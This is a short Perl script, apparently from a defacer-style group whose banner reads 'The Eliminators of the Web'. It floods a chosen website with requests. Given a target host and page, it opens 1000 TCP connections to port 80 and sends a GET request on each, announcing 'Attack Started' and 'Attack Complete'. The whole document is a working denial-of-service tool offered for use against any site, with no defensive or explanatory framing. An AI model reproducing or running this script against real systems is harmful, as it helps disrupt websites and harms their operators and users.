if(!$ARGV[0]){
        print "U.LP.O.W\n";
        print "www.ulpow.net\n";
        print "The Eliminators of the Web\n";
        print "Usage:perl webspeed.pl targetsite targetpage\n";

} else {

$site = $ARGV[0];
$page = $ARGV[1];


 print "Attack Started\n";




$ish=1;

do {
$ish++;
use IO::Socket;
$socket = new IO::Socket::INET( PeerAddr => $site,
PeerPort => 80,
Proto => 'tcp',
Type => SOCK_STREAM, ) or die "Couldn't Connect to target please check again
address!\n";
print $socket "GET $page HTTP/1.0\r\n";
close($socket);
} while ($ish < 1000);


print ":-; Attack Complete\n";
}
